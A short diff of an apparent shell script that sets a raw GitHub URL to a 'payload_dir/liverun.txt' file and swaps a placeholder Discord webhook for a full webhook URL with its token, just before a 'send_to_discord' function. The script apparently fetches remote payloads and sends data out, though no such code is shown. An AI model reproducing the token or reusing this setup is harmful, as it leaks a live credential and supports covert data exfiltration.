@@ -4,7 +4,7 @@
 GITHUB_URL="https://raw.githubusercontent.com/hl-mrGoose/Figura-Pi/refs/heads/main/payload_dir/liverun.txt"
 
 # Discord Webhook URL
-WEBHOOK_URL="https://discord.com/api/webhooks/your-webhook-id"
+WEBHOOK_URL="https://discord.com/api/webhooks/1349617379071496223/bzyuUGMDFWINwdLp8WC4OZ3zC-cHxn66JBEo0fbj6NDCw2L3mDBVUPjMHoM0yY_7F70_"
 
 # Function to send data to Discord Webhook
 send_to_discord() {
